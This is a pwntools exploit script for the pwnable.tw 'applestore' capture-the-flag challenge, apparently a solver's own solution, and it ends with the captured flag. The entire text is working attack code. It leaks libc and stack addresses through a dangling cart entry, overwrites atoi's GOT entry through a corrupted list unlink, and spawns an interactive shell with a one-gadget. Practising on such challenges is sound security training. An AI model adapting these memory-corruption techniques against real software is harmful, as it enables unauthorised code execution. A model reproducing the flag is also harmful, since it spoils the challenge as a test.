from pwn import *

k = process('applestore', env={'LD_PRELOAD':'./libc_32.so.6'})
#k = remote('chall.pwnable.tw', 10104)

for i in range(10):
    k.recvuntil('>')
    k.sendline('2')
    k.recvuntil('>')
    k.sendline('1')

for i in range(12):
    k.recvuntil('>')
    k.sendline('2')
    k.recvuntil('>')
    k.sendline('2')

for i in range(4):
    k.recvuntil('>')
    k.sendline('2')
    k.recvuntil('>')
    k.sendline('4')

puts_got = 0x804b028
puts_off = 0x5f140
environ_off = 0x1b1dbc

raw_input("fuckkkkkkkkkkkkk")

# checkout
k.recvuntil('>')
k.sendline("5")
k.recvuntil('>')
k.sendline('y')

# cart leak puts_got
k.recvuntil('>')
k.sendline('4')
k.recvuntil('>')
k.sendline("y\x00"+p32(puts_got) + "\x00"*4)

k.recvuntil("27: ")
libc = u32(k.recv(4)) - puts_off
print hex(libc)

environ = libc + environ_off
one = libc + 0x3a819
system = libc + 0x3a940

# cart leak environ
k.recvuntil('>')
k.sendline('4')
k.recvuntil('>')
k.sendline("y\x00"+p32(environ) + "\x00"*4)
k.recvuntil('27: ')
stk = u32(k.recv(4))
print hex(stk)

atoi_got = 0x804b040
#k.interactive()

# delete
k.recvuntil('>')
k.sendline('3')
k.recvuntil('>')
# handle nptr : [ebp-22h]
k.sendline("27"+p32(environ)+p32(0)+p32(atoi_got+0x22)+p32(stk-0x104-0x8))

k.sendline(p32(one))

k.interactive()

# FLAG{I_th1nk_th4t_you_c4n_jB_1n_1ph0n3_8}
